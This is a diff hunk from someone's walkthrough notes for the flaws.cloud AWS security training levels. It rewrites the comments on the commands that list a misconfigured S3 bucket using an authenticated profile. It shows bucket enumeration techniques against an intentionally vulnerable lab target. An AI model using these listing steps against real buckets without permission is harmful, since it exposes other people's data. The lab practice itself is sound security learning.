@@ -10,8 +10,8 @@ $ aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2 # or just vis
 2017-02-27 12:59:30       1051 secret-dd02c7c.html
 
 * level 2 - bucket with "Any Authenticated AWS User" has List permissions
-$ aws configure --profile sebflaws # create user in IAM to get aws_secret_key_id and aws_secret_access_key, user needs the AmazonS3ReadOnlyAccess permission
-$ aws s3 --profile sebflaws ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud # in IAM, user needs to have AmazonS3FullAccess policy under permissions
+$ aws configure --profile sebflaws # create a user with the AmazonS3ReadOnlyAccess permission in IAM and configure profile with the aws_secret_key_id and aws_secret_access_key
+$ aws s3 --profile sebflaws ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
 2017-02-27 13:02:15      80751 everyone.png
 2017-03-02 11:46:41       1434 hint1.html
 2017-02-27 13:04:39       1035 hint2.html
